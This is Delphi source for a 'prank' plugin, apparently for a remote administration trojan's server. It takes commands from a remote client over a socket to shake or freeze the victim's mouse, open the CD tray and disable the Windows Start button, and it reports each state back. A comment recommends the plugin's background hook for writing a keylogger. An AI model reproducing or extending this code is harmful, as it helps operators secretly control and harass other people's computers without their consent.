library BromasS;


uses
  windows,
  UnitBromas,
  Winsock;

var
  ConId : integer;
  PNombre : string;

{Esta funcion es llamada al iniciar coolserver, se realiza en un thread independiente}
{puede ser muy util por ejemplo para programar un keylogger u otros programas similares}
procedure CargaOffline();stdcall;
begin
//En el caso de las bromas no nos sirve para nada :p
end;


{Esta función es llamada cuando se abre el plugin desde el cliente}
procedure Start(id:integer;nombre:string);stdcall;
begin
  ConID := ID; //Socket
  PNombre := nombre; //Nombre del plugin
end;

procedure Enviars(S: string);
begin
  //Para enviar información desde un plugin se envia en el siguiente formato:
  // PLUGINDATA|NOMBREPLUGIN|DATA#10#15#80#66#77#1#72#87
  s := 'PLUGINDATA|'+PNombre+'|'+s+#10#15#80#66#77#1#72#87;
  Send(ConID, S[1], Length(s), 0);
end;

{Al recibir información desde el cliente}
procedure RecData(data:string);stdcall;
var
  enviar : string;
  Recibido : string;
begin
  Recibido := data;
  if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
  begin
    Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la cadena
    if Recibido = 'ACTIVAR' then
    begin
      //activar mouse tembloroso
      CongelarMouse(False); //Lo descongela si está congelado
      TemblarMouse(True);
      Enviars('MOUSETEMBLOROSO|1');
      end
    else
    begin
      //desactivar mouse tembloroso
      TemblarMouse(False);
      Enviars('MOUSETEMBLOROSO|0');
    end;
  end;

  if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
  begin
    Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la cadena
    if Recibido = 'ACTIVAR' then
    begin
      //activar congelar mouse
      TemblarMouse(False); //El mouse para de temblar si se congela
      CongelarMouse(True);
      {sleep(10000); //Recomendado Para debug :p
      CongelarMouse(False);}
      Enviars('CONGELARMOUSE|1');
    end
    else
    begin
      //desactivar congelar mouse
      CongelarMouse(False);
      Enviars('CONGELARMOUSE|0');
    end;
  end;

  if Copy(Recibido, 1, 7) = 'ABRIRCD' then
  begin
    Delete(Recibido, 1, 8); //Borra 'ABRIRCD|' de la cadena
    if Recibido = 'ACTIVAR' then
    begin
      //abrir cd
      mciSendString('Set cdaudio door open wait', nil, 0, hInstance);
      Enviars('ABRIRCD|1');
    end
    else
    begin
      //cerrar cd
      mciSendString('Set cdaudio door closed wait', nil, 0, hInstance);
      Enviars('ABRIRCD|0');
    end;
  end;

  if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
  begin
    Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la cadena
    if Recibido = 'ACTIVAR' then
    begin
      //Desactivar boton inicio
      EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                    , 0, 'Button', nil), False);
      Enviars('MATARBOTONINICIO|1');
    end
    else
    begin
      //Activar boton inicio
      EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil)
                    , 0, 'Button', nil), True);
      Enviars('MATARBOTONINICIO|0');
    end;
  end;
  //Fin de comandos relaccionados con las bromas
end;

{Cuando se desconecta el servidor es llamada}
procedure Stop();Stdcall;
begin 
end;

exports CargaOffline, Start, RecData, Stop;

end.
